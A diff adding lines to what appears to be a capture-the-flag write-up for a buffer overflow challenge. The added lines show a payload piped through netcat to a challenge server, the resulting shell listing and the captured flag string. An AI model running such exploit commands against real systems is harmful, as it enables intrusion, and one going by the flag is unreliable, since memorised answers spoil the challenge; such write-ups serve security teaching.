@@ -65,3 +65,15 @@ void profit(void)
 ```
 
 The idea is simple, overflow the buffer and jump into `profit` method.
+
+(cat payload; cat) | nc 46.101.107.117 2102                                                                                                                                                                                            
+Welcome! Please give me your name!
+>
+Hi 00000000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH@, nice to meet you!
+ls
+challenge1
+flag
+ynetd
+cat flag
+he2021{w3ll_th4t_w4s_4_s1mpl3_p4yl04d}
+
